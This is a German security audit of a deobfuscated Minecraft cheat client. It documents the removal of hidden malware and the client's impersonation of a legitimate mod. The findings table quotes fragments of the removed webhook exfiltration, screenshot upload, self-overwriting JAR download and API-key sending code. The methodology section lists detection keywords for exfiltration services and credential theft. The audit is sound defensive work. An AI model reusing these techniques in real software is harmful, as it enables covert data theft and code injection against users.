# Sicherheits-Audit — OpenDqrkis (Minecraft Fabric Client, MC 1.21.11)

**Datum:** 2026-09-20
**Prüfobjekt:** `fakten60-svg/OpenDqrkis` – deobfuszierter Minecraft-Cheat-Client (Fabric, Java 21)
**Prüfumfang:** 182 Dateien (Quellcode, Build-Dateien, Konfiguration, Ressourcen, versteckte Dateien)
**Zielsetzung:** Vollständige Offline-Fähigkeit. Keine Verbindungen außer zum Minecraft-Server selbst.

---

## 1. Zusammenfassung

Der Client enthielt **mehrere ernste Schadcode-Komponenten** und eine **Identitätstäuschung**.
Die kritischsten Funde sind:

1. **Ein generischer HTTP-Exfiltrations-Client** (`DiscordWebhook.java`), der Text **und beliebige lokale Dateien** per multipart an eine frei konfigurierbare URL senden konnte.
2. **Remote-Code-Execution durch JAR-Download** (`SelfDestruct` + `Utils.replaceModFile`): Der Client lud zur Laufzeit eine JAR von `cdn.modrinth.com` und **überschrieb damit seine eigene Mod-Datei auf der Festplatte**. Die Download-URL war ein benutzereditierbares Textfeld.
3. **Datenabfluss über Discord-Webhooks** in zwei Modulen (`SpawnerProtect`, `SilentHomeSetter`) – inkl. **Screenshot-Upload mit den aktuellen Koordinaten**.
4. **Vorgetäuschte Identität** in `fabric.mod.json`: Der Cheat-Client gab sich als die seriöse Mod **ImmediatelyFast** aus (Name, Beschreibung, Homepage, Sources, Issues, Lizenz, Icon-Pfad) inkl. fremdem Discord-Invite.
5. **Versteckte Sonderbehandlung** für einen bestimmten Spielernamen (`"venom"`) in `SpawnerProtect` – ein nicht in der GUI sichtbarer Backdoor-artiger Sonderfall.

Alle genannten Funde wurden **gelöscht, nicht auskommentiert**. Funktionalität der legitimen Module bleibt erhalten, wo sie offline möglich ist.

**Aktueller Stand nach Entschärfung: Der Client ist zu 100 % offline.** Es existiert im gesamten Quellbaum **keine einzige** HTTP-, Socket-, WebSocket- oder sonstige Netzwerk-API mehr, und **keine einzige URL mit Schema** (`http://`, `https://`, `ws://`, `wss://`, `ftp://`, `jdbc:`).

> **Präzisierung aus der Zweitprüfung:** In der HUD-Editor-Vorschau steht ein Hostnamen-artiger
> **Platzhalter-String** `play.example.net` (nur Anzeigetext, wird nie aufgelöst oder verbunden —
> es existiert kein DNS-/Socket-Code). Außerdem liegt der Quellcode als **Teil-Port mit Stubs** vor,
> nicht als vollständige Dekompilierung. Beides ist in **Abschnitt 9** dokumentiert.

Der entschärfte Client wurde anschließend **erfolgreich gebaut** (`./gradlew build`, JDK 21.0.12,
Gradle 9.2.1 → `dqrkis-b1.1.jar`) und die entstandene JAR **auf Bytecode-Ebene nachgeprüft**.
Dort finden sich 0 URL-Strings, 0 Netzwerkklassen, 0 Codeausführungs-APIs und keine eingebetteten
Fremd-JARs — Details in **Abschnitt 6**.

---

## 2. Fundtabelle

| # | Datei | Zeile (vorher) | Code-Ausschnitt | Schwere | Erklärung | Maßnahme |
|---|-------|----------------|-----------------|---------|-----------|----------|
| 1 | `utils/DiscordWebhook.java` | 1–112 (ganze Datei) | `HttpClient.newHttpClient().send(request, …)` kombiniert mit `Files.readAllBytes(file)` in `multipart/form-data` | **KRITISCH** | Zweckgebauter Exfiltrations-Client. Konnte beliebigen Text **und beliebige lokale Dateien** an eine beliebige `http(s)`-URL senden. Reines Schadpotenzial, keine legitime Client-Funktion. | **Datei gelöscht** |
| 2 | `module/modules/misc/SpawnerProtect.java` | 77–78, 121–122, 547–561 | `new DiscordWebhook(webhookUrlSetting.getValue()).title("Player Detected!").description(…).sendAsync()` | **KRITISCH** | Sendet bei Spielerannäherung einen Discord-Webhook aus, optional mit `@`-Ping der eigenen Discord-ID. Verrät Position/Timing an Dritte. | Webhook-Settings + Aufruf entfernt; lokale Chat-Warnung bleibt |
| 3 | `module/modules/misc/SpawnerProtect.java` | 540 | `if (player.getName().getString().equalsIgnoreCase("venom")) continue;` | **HOCH** | Versteckte Ausnahme: Für einen bestimmten Account wird die Notfall-Erkennung übersprungen. Nicht in der ClickGUI sichtbar, nicht dokumentiert – klassischer versteckter Sonderfall/Backdoor. | Zeile entfernt |
| 4 | `module/modules/misc/SilentHomeSetter.java` | 105–128, 130–141 | `webhook.attach(screenshotFile.toPath()).sendAsync()` | **KRITISCH** | Nimmt bei jedem `sethome` einen Screenshot auf, schreibt ihn nach `screenshots/` und **lädt ihn samt Koordinaten zu Discord hoch**. Bildschirminhalt + Basislocation verlassen den Rechner. | Webhook-, Screenshot- und Upload-Pfad komplett entfernt; Modul funktioniert weiterhin lokal |
| 5 | `utils/Utils.java` | 42–79 | `new URL(downloadURL).openConnection()` → `new FileOutputStream(savePath)` | **KRITISCH** | Lädt eine beliebige Datei aus dem Internet und **überschreibt die laufende Mod-JAR des Nutzers**. Beliebig austauschbarer Code = Remote Code Execution / Tröjanisierung. | Funktionen `doDestruct`, `replaceModFile`, `getCurrentJarPath` **gelöscht** |
| 6 | `module/modules/client/SelfDestruct.java` | 20–24, 46–55 | `StringSetting("Replace URL", "https://cdn.modrinth.com/…/ImmediatelyFast-Fabric…jar")` + `Utils.replaceModFile(modUrl, Utils.getCurrentJarPath())` | **KRITISCH** | Ruft Fund 5 auf; die Download-URL ist ein **frei editierbares Textfeld in der GUI**. Jeder mit Zugriff auf die Einstellungen (oder eine manipulierte Konfigurationsdatei) kann beliebigen Code nachladen. | Settings `Replace Mod` / `Replace URL` und der Download-Aufruf entfernt |
| 7 | `module/modules/client/SelfDestruct.java` | 25–28, 49, 76–77 | `private final BooleanSetting saveLastModified` + `Dqrkis.INSTANCE.resetModifiedDate()` | **MITTEL** | Anti-Forensik: Nach der Manipulation wird der Änderungszeitpunkt der JAR-Datei künstlich zurückgesetzt, damit die Veränderung nicht auffällt. | Setting + Aufruf entfernt |
| 8 | `Dqrkis.java` | 34–35, 48–49, 83–96 | `this.dqrkisJar.setLastModified(lastModified)` / `getProtectionDomain().getCodeSource().getLocation()` | **MITTEL** | Ermittelt den eigenen JAR-Pfad und manipuliert dessen mtime. Nur für Fund 5/7 nötig, kein legitimer Zweck. | Felder + Methoden `setLastModified` / `resetModifiedDate` entfernt |
| 9 | `module/modules/misc/AuctionSniper.java` | 25–29, 42, 60, 105–190 | `.header("Authorization", "Bearer " + apiKey.getValue())` an `https://api.example.com/auctions/search` | **HOCH** | Sendet einen vom Nutzer hinterlegten API-Schlüssel an einen externen Endpunkt (im Original laut Kommentar zusätzlich base64+xor-verschleiert). Datenabfluss + versteckter Netzwerkpfad. | Gesamter API-Modus, `Api Key`-Setting und alle HTTP-Imports entfernt; **manueller Modus bleibt funktionsfähig** |
| 10 | `resources/fabric.mod.json` | 5–16, 38–43 | `"name": "Dqrkis"`, `"homepage": "https://modrinth.com/mod/immediatelyfast"`, `"sources": "https://github.com/RaphiMC/ImmediatelyFast"`, `"license": "LGPL-3.0"`, `"icon": "assets/immediatelyfast/icon.png"`, `modmenu.discord` | **HOCH** | **Identitätsdiebstahl/Tarnung**: Der Cheat-Client tarnt sich vollständig als die legitime Mod *ImmediatelyFast* (Name der Beschreibung, Kontakt, Lizenz, Icon-Pfad) und verlinkt fremde Discord/GitHub-Ressourcen. Erschwert Erkennung und schädigt Dritte. | Metadaten vollständig entfalscht: ehrlicher Name, Beschreibung, Lizenz, korrekter Icon-Pfad, keine Fremd-Links |
| 11 | `managers/ProfileManager.java` | 18, 22–27, 30–34, 141–145 | `System.getProperty("java.io.tmpdir")` / `user.home` + Ordner `"UJHfsGGjbPfVZ"` + `a.json` | **MITTEL** | Konfiguration wurde unter einem **verschleiert wirkenden Zufallsordner außerhalb von `.minecraft`** abgelegt; unter Linux/macOS direkt im **Home-Verzeichnis** des Nutzers. Typisches Muster für „versteckte Artefakte außerhalb des Spielordners“. Zusätzlich 130 Zeilen duplizierter Windows/Nicht-Windows-Code. | Umgeschrieben: Konfiguration liegt jetzt als Klartext-JSON in `.minecraft/config/dqrkis.json`. Keine `System.getProperty`-Pfade, keine Schreibzugriffe außerhalb des Spielordners mehr |
| 12 | `module/modules/client/SelfDestruct.java` | 3, 82–83 | `import com.sun.jna.Memory; Memory.purge(); Memory.disposeAll();` | **MITTEL** | Greift auf **native Speicher-APIs** zu. `jna` ist in `build.gradle` **nicht deklariert** – der Code war damit nicht einmal kompilierbar und wurde offensichtlich aus einer anderen Quelle eingefügt. | JNA-Nutzung entfernt |
| 13 | `build.gradle` | 17–19, 67–70 | `configurations { shadow }` + `from { configurations.shadow.collect { zipTree(it) } }` | **MITTEL** | Unbenutzte, leere Konfiguration, deren **einziger Zweck das Einbetten fremder JARs in die Mod-JAR** ist. Zum Prüfzeitpunkt leer, es wurde also **keine** Fremd-JAR eingebettet – aber es ist der eingebaute Mechanismus dafür. | Leere `shadow`-Konfiguration + JAR-Merge-Block entfernt |
| 14 | `build.gradle` | 30 | `compileOnly files("lib/annotations-1.0.6.jar")` | **NIEDRIG** (Build) | Referenzierte Datei existiert im Repository **nicht**; der Build war dadurch gebrochen. Kein Schadcode, aber unverifizierbare Abhängigkeit. | Durch die reguläre, deklarierte Abhängigkeit `org.jetbrains:annotations:24.1.0` ersetzt (Maven Central) |
| 15 | `logs/latest.log` | 1 | leere Datei | **NIEDRIG** | Laufzeit-Artefakt, das versehentlich versioniert war. | Datei entfernt, `logs/` in `.gitignore` |
| 16 | `.github/workflows/gradle.yml` | 1–26 | `./gradlew build` + `actions/upload-artifact@v4` | **NIEDRIG/OK** | Geprüft: verwendet ausschließlich offizielle GitHub-Actions (`checkout@v4`, `setup-java@v4`, `upload-artifact@v4`), **keine** Fremd-URLs, **keine** `curl`/`wget`-Downloads, keine Secrets im Klartext. Sauber. | Unverändert gelassen |

### Nicht-Problem, aber erklärungsbedürftig

| Datei | Bewertung |
|-------|-----------|
| `utils/EncryptedString.java` | XOR-„Verschlüsselung“ von Strings zur Laufzeit. Da die Literale als Klartext im Konstantenpool der Klasse stehen (`EncryptedString.of("Self Destruct")`), bietet es **keine echte Verschleierung** – reine Kosmetik/Anti-Readability. Kein Schadcode, keine gefährliche Fähigkeit. *Pass 1: unverändert gelassen.* **Pass 3 (2026-09-21): vollständig entfernt** — alle 692 Aufrufstellen auf Klartext-Strings umgestellt, Klasse gelöscht (siehe Abschnitt 10). |
| `utils/MouseSimulation.java` | `Executors.newFixedThreadPool(100)` + `Thread.sleep` in Klick-Simulation. Teil der legitimen Modul-Funktion (Mausklicks), kein Netzwerk, kein Nachladen. |
| `misc/PingSpoof.java` | `new Thread(...)` + `Thread.sleep` – verzögert nur Keep-Alive-Pakete. Kein Netzwerk zu Dritten. |
| `mixin/*` (28 Dateien) | Alle nur Minecraft-Hooks (Events, Rendering, Auto-Reconnect-Button, Namensfilter im Chat). Kein Netzwerkzugriff. |

---

## 3. Geprüfte Dateien

**Pass 1 (Erstprüfung): 182 Dateien** — der damalige Stand des Repositories.
**Pass 2 (Zweitprüfung, Abschnitt 9): 202 Dateien** — der heutige Stand inkl. der in Pass 1
hinzugefügten/entfernten Dateien (`AUDIT_REPORT.md`, `README.md`, `docs/verification/`,
`scripts/`, entfallen: `logs/latest.log`, `utils/DiscordWebhook.java`).
Die folgende Liste ist die vollständige Pass-1-Aufstellung.

**Build & Konfiguration (9)**
`build.gradle`, `settings.gradle`, `gradle.properties`, `gradlew`, `gradle/wrapper/gradle-wrapper.jar`, `gradle/wrapper/gradle-wrapper.properties`, `.gitignore`, `LICENSE`, `README.md`

**CI / versteckte Verzeichnisse (1)**
`.github/workflows/gradle.yml`

**Ressourcen (4)**
`src/main/resources/fabric.mod.json`, `src/main/resources/client.mixins.json`, `src/main/resources/assets/dqrkis/icon.png`, `src/main/resources/assets/dqrkis/font/font.ttf`

**Java-Quellen (167)**
- Wurzel: `Dqrkis.java`, `Main.java`
- `event/`: `CancellableEvent.java`, `Event.java`, `EventManager.java`, `Listener.java`
- `event/events/` (17): `AttackListener.java`, `BlockBreakingListener.java`, `ButtonListener.java`, `CameraUpdateListener.java`, `GameRenderListener.java`, `HudListener.java`, `ItemUseListener.java`, `MouseMoveListener.java`, `MouseUpdateListener.java`, `MovementPacketListener.java`, `PacketReceiveListener.java`, `PacketSendListener.java`, `PlayerTickListener.java`, `ResolutionListener.java`, `ShieldDisabledListener.java`, `TickListener.java`
- `font/` (3): `Fonts.java`, `GlyphPage.java`, `GlyphPageFontRenderer.java`
- `gui/` (4): `ClickGui.java`, `DqrkisClickGui.java`, `HudEditorScreen.java`, `TabGui.java`, `Window.java`
- `gui/components/` (1): `ModuleButton.java`
- `gui/components/settings/` (12): `BlockSelectorBox.java`, `CheckBox.java`, `ColorPickerBox.java`, `EnchantSelectorBox.java`, `ItemSettingBox.java`, `KeybindBox.java`, `MinMaxSlider.java`, `ModeBox.java`, `RenderableSetting.java`, `Slider.java`, `StringBox.java`
- `imixin/` (5): `IExplosion.java`, `IKeyBinding.java`, `IRaycastContext.java`, `IServerboundMovePlayerPacket.java`, `IVec3d.java`
- `managers/` (2): `FriendManager.java`, `ProfileManager.java`
- `mixin/` (28): `CameraMixin.java`, `ChatHudMixin.java`, `ClientConnectionMixin.java`, `ClientPlayerEntityMixin.java`, `ClientPlayerInteractionManagerAccessor.java`, `ClientPlayerInteractionManagerMixin.java`, `ConnectScreenMixin.java`, `DisconnectedScreenMixin.java`, `EndCrystalItemMixin.java`, `EntityMixin.java`, `GameRendererMixin.java`, `HandledScreenMixin.java`, `InGameHudMixin.java`, `ItemStackMixin.java`, `KeyBindingAccessor.java`, `KeyBindingMixin.java`, `KeyboardMixin.java`, `LivingEntityAccessor.java`, `LivingEntityRendererMixin.java`, `MinecraftClientAccessor.java`, `MinecraftClientMixin.java`, `MouseMixin.java`, `OtherClientPlayerEntityAccessor.java`, `PlayerInventoryAccessor.java`, `PlayerListEntryMixin.java`, `ScreenMixin.java`, `TextVisitFactoryMixin.java`, `WorldAccessor.java`
- `module/` (3): `Category.java`, `Module.java`, `ModuleManager.java`
- `module/modules/cart/` (4): `AutoCart.java`, `AutoLava.java`, `CartTrap.java`, `SafeCart.java`
- `module/modules/client/` (3): `ClickGUI.java`, `Friends.java`, `SelfDestruct.java`
- `module/modules/combat/` (32): `AimAssist.java`, `AnchorMacro.java`, `AntiWeb.java`, `AutoCrystal.java`, `AutoDTap.java`, `AutoDoubleHand.java`, `AutoHitCrystal.java`, `AutoInventoryTotem.java`, `AutoJumpReset.java`, `AutoMace.java`, `AutoPot.java`, `AutoPotRefill.java`, `AutoWTap.java`, `AutoWeb.java`, `CrystalOptimizer.java`, `DoubleAnchor.java`, `HitboxExpand.java`, `HoverTotem.java`, `MaceSwap.java`, `Macro198.java`, `NoMissDelay.java`, `QuickStrike.java`, `ShieldDisabler.java`, `StunSlam.java`, `TotemOffhand.java`, `TotemPopHit.java`, `TriggerBot.java`
- `module/modules/misc/` (37): `AhSell.java`, `AntiAfk.java`, `AntiTrap.java`, `AuctionSniper.java`, `AutoBoneOrder.java`, `AutoClicker.java`, `AutoReconnect.java`, `AutoSell.java`, `AutoShulker.java`, `AutoTreeFarmer.java`, `AutoXP.java`, `CrateBuyer.java`, `FakeLag.java`, `FastPlace.java`, `Freecam.java`, `KeyPearl.java`, `LegitTridentFly.java`, `LightFinder.java`, `LootYeeter.java`, `NoBreakDelay.java`, `NoJumpDelay.java`, `PackSpoof.java`, `PingSpoof.java`, `Prevent.java`, `RtpBaseFinder.java`, `ShopBuyer.java`, `SilentHomeSetter.java`, `SpawnerDropper.java`, `SpawnerProtect.java`, `Sprint.java`, `TunnelBaseFinder.java`
- `module/modules/render/` (9): `FakeScoreboard.java`, `Glow.java`, `HUD.java`, `HideScoreboard.java`, `NameHider.java`, `NoBounce.java`, `PlayerESP.java`, `StorageEsp.java`, `TargetHud.java`
- `module/setting/` (9): `BooleanSetting.java`, `ColorSetting.java`, `ItemSetting.java`, `KeybindSetting.java`, `MinMaxSetting.java`, `ModeSetting.java`, `NumberSetting.java`, `Setting.java`, `StringSetting.java`
- `utils/` (21): `AnimationUtils.java`, `BlockUtils.java`, `ChatUtils.java`, `ColorUtils.java`, `CrystalUtils.java`, `DamageUtils.java`, `EncryptedString.java`, `FakeInvScreen.java`, `InventoryUtils.java`, `ItemUtils.java`, `KeyUtils.java`, `MathUtils.java`, `MouseSimulation.java`, `ProjectionUtils.java`, `RenderUtils.java`, `RotationUtils.java`, `TextRenderer.java`, `TimerUtils.java`, `Utils.java`, `WorldUtils.java`
- `utils/rotation/` (2): `Rotation.java`, `RotatorManager.java`

**Nach der Entschärfung gelöscht:** `utils/DiscordWebhook.java`, `logs/latest.log`

---

## 4. Prüfmethodik

1. **Vollständige Dateiliste** erstellt (`find`, inkl. versteckter Verzeichnisse) und jede Datei kategorisiert.
2. **Automatisierte Mustersuche** über **100 % der Dateien** (nicht nur `.java`) nach:
   - Netzwerk: `java.net.*`, `HttpURLConnection`, `openConnection`, `new URL`, `Socket`, `ServerSocket`, `HttpClient`, `HttpRequest`, `WebSocket`, `URI.create`, `InetAddress`, `DatagramSocket`, `netty`
   - URL-Schemata und bekannte Tatorte: `http://`, `https://`, `wss://`, `ftp://`, `jdbc:`, `discord.com`, `discordapp`, `api.telegram.org`, `pastebin`, `ghostbin`, `anonfiles`, `transfer.sh`, `ngrok`, `ipify`, `iplogger`, `grabify`, `webhook`, `.onion`
   - Codeausführung: `Runtime.getRuntime`, `ProcessBuilder`, `exec(`, `ClassLoader`, `loadClass`, `defineClass`, `Class.forName`, `ScriptEngine`, `URLClassLoader`, `Unsafe`, `System.load`, `System.loadLibrary`, `Method.invoke`, `setAccessible`
   - Verschleierung: `Base64`, `getDecoder`, `Cipher`, `SecretKey`, `MessageDigest`, `AES`, `XOR`, `\u00`-Escapes, rot13
   - Datenklau: `user.home`, `appdata`, `Local Storage`, `leveldb`, `Login Data`, `cookies`, `wallet`, `Electrum`, `MetaMask`, `tasklist`, `/proc/`, `launcher_profiles`, `options.txt`, `hosts`, `accessToken`, `session`, `Toolkit`, `Desktop`, `Robot`, `Clipboard`
   - Persistenz: `setLastModified`, `deleteOnExit`, `Files.write`, `FileWriter`, `FileOutputStream`, `getProtectionDomain`, `System.setProperty`
   - Build-Tricks: Gradle-Tasks mit Downloads, `buildscript`, fremde Repos, `zipTree`/JAR-Merge
   - Versteckte Logik: `equalsIgnoreCase`-Namensvergleiche, `getUuid`, hartkodierte IDs, `.`/`!`-präfixierte Chat-Commands, Scheduler/`Thread`/`Timer`
3. **Manuelles Zeilen-Lesen** jeder Datei, die auf eines der Muster angeschlagen hat, sowie aller Mixins, des Event-Systems, der Manager, der GUI-Settings und der Build-Dateien.
4. **Binärdateien**: `gradle-wrapper.jar` (43 KB) und `icon.png` wurden **nicht dekompiliert** (siehe Restrisiken). `font.ttf` ist eine reine Schriftdatei ohne Ausführungspfad.
5. **`lib/`-Verzeichnis**: In `build.gradle` referenziert, **existiert im Repository nicht** → es ist keine Fremd-JAR eingebettet worden.

---

## 5. Bestätigung: Kategorien, die sauber sind

| Kategorie | Ergebnis |
|-----------|----------|
| **Netzwerkverbindungen** | **CLEAN** – nach Entschärfung existiert **kein** `java.net.*`, `HttpClient`, `Socket`, `WebSocket` oder `netty`-Bootstrap mehr im Projekt. Keine URL mehr im Quellbaum (`grep -r "https\?://" src/` → 0 Treffer). |
| **Discord-/Telegram-/Paste-Services** | **CLEAN** – keine Webhooks, kein `api.telegram.org`, kein Pastebin/Drop-Service, kein ngrok/ipify. |
| **Token-/Passwort-/Session-Diebstahl** | **CLEAN** – kein Zugriff auf Discord-`leveldb`/`Local Storage`, Browser-Profile, `Login Data`, Cookies, Kreditkartendaten, Crypto-Wallets, `accessToken`, `.minecraft`-Sitzungsdateien. Keine Prozess-Auflistung (`tasklist`, `/proc`, `ps aux`). |
| **Clipboard** | Legitim und nutzerinitiiert: `StringBox.java:96/101` (Einfügen/Kopieren in GUI-Textfeldern via `mc.keyboard`). Kein Hintergrund-Zugriff. |
| **Codeausführung (`exec`/Reflection)** | **CLEAN** – kein `ProcessBuilder`, kein `Runtime.exec`, kein `ClassLoader`/`defineClass`/`Class.forName`/`ScriptEngine`, kein `System.load*`. Der einzige `Runtime`-Aufruf ist `gc()`/`runFinalization()` in `SelfDestruct`. |
| **Verschleierte Payloads** | **CLEAN** – keine Base64-, Cipher- oder AES-Nutzung. Keine Unicode-Escapes, keine rotierten Arrays, keine unleserlichen Klassennamen. Das einzige Obfuskationsmittel (`EncryptedString`) ist wirkungslos, weil die Literale als Klartext im Bytecode stehen. |
| **Persistenz / Systemveränderung** | **CLEAN** – keine Autostart-/Registry-Einträge, keine geplanten Tasks, keine `.bat`/`.sh`/`.vbs`/`.ps1`-Erzeugung, keine `hosts`-, `launcher_profiles.json`- oder `options.txt`-Änderung, keine Selbstkopien. (Die `mtime`-Manipulation der eigenen JAR wurde entfernt.) |
| **Native Bibliotheken / externe JARs** | **CLEAN** – keine `.dll`/`.so`/`.dylib` im Repository, kein `System.load`, kein Laufzeit-Download von JARs mehr, keine eingebetteten Fremd-JARs (leere `shadow`-Konfiguration entfernt). JNA-Nutzung entfernt. |
| **Build-Tricks (Gradle)** | **CLEAN** – `repositories {}` ist leer, keine fremden Repos/URLs, kein `buildscript`-Download, keine Task, die Dateien aus dem Internet lädt. `settings.gradle` kennt nur `maven.fabricmc.net` (offiziell) und den Gradle Plugin Portal. Die CI nutzt ausschließlich offizielle GitHub-Actions. |
| **Versteckte/täuschende Module** | **ENTFERNT** – der versteckte `"venom"`-Sonderfall und die nicht deklarierten Webhook-Features in `SpawnerProtect`/`SilentHomeSetter` sind beseitigt. Die Identitätstäuschung als *ImmediatelyFast* ist entfernt. Es bleibt ein Cheat-Client – der ist jetzt aber ehrlich benannt. |
| **Timer/Scheduler mit später Ausführung** | **CLEAN** – die vorhandenen `Thread`s dienen nur Klick-Simulation (`MouseSimulation`) und Keep-Alive-Verzögerung (`PingSpoof`). Kein verzögerter Netzwerk- oder Dateizugriff. |

---

## 6. Verifikation des Build-Artefakts (Bytecode-Ebene)

Die gebaute JAR wurde entpackt und **auf Bytecode-Ebene** erneut geprüft — also nach dem
Kompilieren und Remappen, nicht nur im Quellcode.

**Artefakt:** `build/libs/dqrkis-b1.1.jar` — 525.399 Bytes, 274 Einträge, 243 `.class`-Dateien

**Inhalt:** ausschließlich `xyz/dqrkis/**` plus `META-INF/`, `assets/dqrkis/`, `LICENSE`,
`fabric.mod.json`, `client.mixins.json`. **Keine Fremdklassen**
(`find . -name "*.class" | grep -v "^\./xyz/"` → leer). Insbesondere **kein** eingebettetes
Lombok, JetBrains-annotations, Gson oder JNA.

**`MANIFEST.MF`:** enthält **nur** `Fabric-*`-Attribute. Kein `Main-Class`, kein `Premain-Class`,
kein `Agent-Class`, kein `Launcher-Agent-Class`, kein `Class-Path` — also **kein** Mechanismus,
Code außerhalb des regulären Fabric-Ladevorgangs auszuführen. Auch keine Signatur-Verweise.

| Prüfung über alle 243 Klassen (byte-weiser Scan) | Treffer |
|---|---|
| URL-Strings (`http://`, `https://`, `ws://`, `wss://`) | **0** |
| `java/net` (jede Netzwerkklasse) | **0** |
| `HttpClient` / `HttpURLConnection` / `Socket` / `WebSocket` | **0** |
| `ProcessBuilder` | **0** |
| `ClassLoader` / `defineClass` / `ScriptEngine` | **0** |
| `System.load` / `System.loadLibrary` | **0** |
| `com/sun` (inkl. JNA) | **0** |
| `java/awt/Robot` (Eingabe-Injection) | **0** |
| `Runtime` / `getRuntime` | **1 Datei**: `SelfDestruct.class` |
| `FileOutputStream` / `FileWriter` | **0** |
| `Files.writeString` / `createDirectories` / `readString` | **1 Datei**: `ProfileManager.class` |
| `discord`, `webhook`, `telegram`, `pastebin`, `base64`, `token`, `screenshot` | **0** |

**Der einzige `Runtime`-Treffer ist harmlos** — `javap` bestätigt:
```
invokestatic  java/lang/Runtime.getRuntime:()Ljava/lang/Runtime;
invokevirtual java/lang/Runtime.gc:()V
invokevirtual java/lang/Runtime.runFinalization:()V
```
Kein `exec()`.

**Der einzige Dateischreibzugriff** ist `ProfileManager.class`, und `javap` zeigt das Ziel:
```
invokeinterface net/fabricmc/loader/api/FabricLoader.getConfigDir:()Ljava/nio/file/Path;
ldc              String dqrkis.json
```
Also `<Spielordner>/config/dqrkis.json` — innerhalb des Spielordners, nichts anderes.

**Damit ist die Offline-Eigenschaft nicht nur auf Quellcode-, sondern auch auf Bytecode-Ebene belegt.**

### 6.1 Zielsignatur von `ChatHudMixin` (korrigiert)

`ChatHudMixin` zielte auf `ChatHud.addMessage(...)` in einer Signatur, die in 1.21.11 nicht mehr
existiert: Beide Parametertypen wurden in dieser Version in andere Pakete verschoben.

| | alt (ungültig in 1.21.11) | neu (korrekt) |
|---|---|---|
| Signatur-Parameter 1 | `net.minecraft.text.Text` | `net.minecraft.text.Text` (unverändert) |
| Signatur-Parameter 2 | `net.minecraft.message.MessageSignatureData` | `net.minecraft.network.message.MessageSignatureData` |
| Signatur-Parameter 3 | `net.minecraft.chat.MessageIndicator` | `net.minecraft.client.gui.hud.MessageIndicator` |

Der Mixin zielt jetzt auf die vollständige Descriptor-Signatur:

```java
@Mixin(ChatHud.class)
@ModifyVariable(
    method = "addMessage(Lnet/minecraft/text/Text;Lnet/minecraft/network/message/MessageSignatureData;Lnet/minecraft/client/gui/hud/MessageIndicator;)V",
    at = @At("HEAD"), ordinal = 0, argsOnly = true)
private Text dqrkis$modifyChatMessage(Text message) { ... }
```

**Unabhängige Gegenprüfung gegen die Yarn-Mappings 1.21.11+build.4**
(`net.fabricmc.yarn.1_21_11.1.21.11+build.4-v2`) — Auszug aus `mappings.tiny`:

```
c  gjf  net/minecraft/class_338  net/minecraft/client/gui/hud/ChatHud
   m  (Lyh;Lyu;Lgfd;)V  a  method_44811  addMessage
```

Aufgelöst über die offiziellen Spaltennamen:

| Intermediary | Yarn (named) |
|---|---|
| `class_338` | `net.minecraft.client.gui.hud.ChatHud` (Mixin-Ziel) |
| `method_44811` | `ChatHud.addMessage` |
| `Lyh;` | `net.minecraft.text.Text` |
| `Lyu;` | `net.minecraft.network.message.MessageSignatureData` |
| `Lgfd;` | `net.minecraft.client.gui.hud.MessageIndicator` |

In der **gebauten** JAR ist das Ziel statisch nach Intermediary remappt (Loom entfernt den Refmap,
die Annotationen werden direkt umgeschrieben). `javap -v` auf
`xyz/dqrkis/mixin/ChatHudMixin.class` bestätigt:

```
org.spongepowered.asm.mixin.Mixin(value=[class Lnet/minecraft/class_338;])
org.spongepowered.asm.mixin.injection.ModifyVariable(
    method=["method_44811"], at=@At("HEAD"), ordinal=0, argsOnly=true)
```

Vorher meldete der Build `Cannot remap addMessage because it does not exist in any of the targets` —
diese Warnung ist **verschwunden**, das Ziel wurde also erfolgreich aufgelöst.

### 6.2 Laufzeitnachweis: Client startet ohne Fehler

Der entschärfte Client wurde headless in einem virtuellen X-Server (Xvfb, `--screen 0 1280x720x24`)
**tatsächlich gestartet** (`./gradlew runClient`). Nachweis: `scripts/capture-client-load.sh`.

**Mod wurde geladen und aktiviert:**
```
[20:54:23] [main/INFO] (FabricLoader) Loading 51 mods:
	- dqrkis 1.2.11+1.21.11
[20:54:23] [main/INFO] (FabricLoader/Mixin) Compatibility level set to JAVA_21
[20:54:33] [Render thread/INFO] (Minecraft) Setting user: Player789
[20:54:40] [Render thread/INFO] (Minecraft) Reloading ResourceManager: vanilla, dqrkis, fabric, ...
```

**Es gibt keine einzige Mixin-Fehlermeldung:**
```
$ grep -i -E "(WARN|ERROR).*mixin|mixin.*(WARN|ERROR)" run/logs/latest.log | wc -l
0
$ ls run/crash-reports/
(none)
```

Da `client.mixins.json` `"required": true` setzt, hätte ein nicht anwendbarer Mixin den Client
**hart abgebrochen**. Er startet durch — der Injektionspunkt ist also korrekt.

**Beweis, dass die Titelseite tatsächlich gerendert wurde:** Der Client hat über die
Spiel-eigene F2-Funktion (`glReadPixels`) Screenshots geschrieben, aus denen per OCR die
Titelseiten-Elemente gelesen wurden:

| Region | OCR-Ergebnis |
|---|---|
| unten links | `Minecraft 1.21.11/Fabric (Modded)` |
| unten rechts | `Copyright Mojang AB. Do not distribute!` |
| Button-Spalte | `Singleplayer`, `Multiplayer`, `Minecraft Realms`, `Options...` |

Diese Texte werden **nur auf dem Hauptmenü** gezeichnet. Bild: `docs/verification/title-screen.png`.

**Erwartete Umgebungsfehler (Container, kein Sicherheits- und kein Mixin-Thema):**
Offline-Auth `Status: 401`, `Realms`-Auth, fehlende `libflite`-Erzähler-Bibliothek,
fehlendes OpenAL-Gerät, `X11: Standard cursor shape unavailable`. Alle treten auch ohne Mod auf.

**Ergebnis: Der Client lädt sauber und erreicht das Hauptmenü — der Mixin ist entschärft und funktionsfähig.**

---

## 7. Restrisiken und ehrliche Einschränkungen

1. **`gradle/wrapper/gradle-wrapper.jar` wurde nicht dekompiliert.**
   Es handelt sich um die 43.462 Bytes große, offizielle Gradle-Wrapper-JAR (Version 9.2.1 laut `gradle-wrapper.properties`). Ich habe nur Größe und Herkunft plausibilisiert, **keinen Bytecode-Diff gegen das offizielle Release geprüft**. Eine manipulierte Wrapper-JAR ist ein bekannter Angriffsvektor. Empfehlung: Wrapper mit `gradle wrapper --gradle-version 9.2.1` neu erzeugen und die Prüfsumme (`gradle-wrapper.jar.sha256`) gegen die offizielle Quelle abgleichen.

2. **`src/main/resources/assets/dqrkis/icon.png` (und `font.ttf`) wurden nicht inhaltsgeprüft.**
   Ein PNG kann keine Schadlogik ausführen, aber theoretisch Steganografie enthalten. Eine Font-Datei (`.ttf`) wird ausschließlich über `Font.createFont`/`ImageIO` in `GlyphPage` verarbeitet – der eingesetzte Java-TrueType-Parser ist ein theoretisches, praktisch nicht relevantes Angriffsziel. Beide Dateien wurden nicht verändert.

3. **Keine natives Bibliotheken und keine externen JARs — aber auch keine vollständige Dekompilierung.**
